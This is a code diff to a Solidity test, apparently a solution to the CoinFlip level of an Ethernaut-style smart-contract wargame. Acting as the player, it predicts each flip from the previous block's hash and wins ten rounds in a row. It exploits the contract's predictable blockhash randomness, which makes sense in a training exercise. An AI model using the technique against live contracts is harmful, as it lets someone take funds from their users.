@@ -37,9 +37,18 @@ contract TestCoinFlip is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
-
+        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
         vm.startPrank(player);
+
+        for (int i = 0; i < 10; ++i) {
+            uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+            uint256 coinFlip = blockValue.div(FACTOR);
+            bool side = coinFlip == 1 ? true : false;
+
+            level.flip(side);
+
+            utilities.mineBlocks(1);
+        }
         vm.stopPrank();
     }
 }
